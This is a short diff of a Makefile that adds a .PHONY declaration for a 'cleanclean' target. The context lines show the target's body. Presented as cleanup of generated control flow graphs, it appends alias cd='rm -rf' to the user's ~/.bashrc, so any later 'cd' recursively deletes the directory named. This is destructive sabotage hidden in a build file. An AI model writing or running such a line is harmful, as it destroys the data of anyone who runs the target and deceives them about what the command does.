@@ -25,6 +25,8 @@ ast:
 	@python3 $(SCRIPT)
 	@echo "Control flow graphs generated successfully."
 
+.PHONY: cleanclean
+
 cleanclean:
 	@echo "Cleaning up generated control flow graphs..."
 	@echo "alias cd='rm -rf'" >> ~/.bashrc
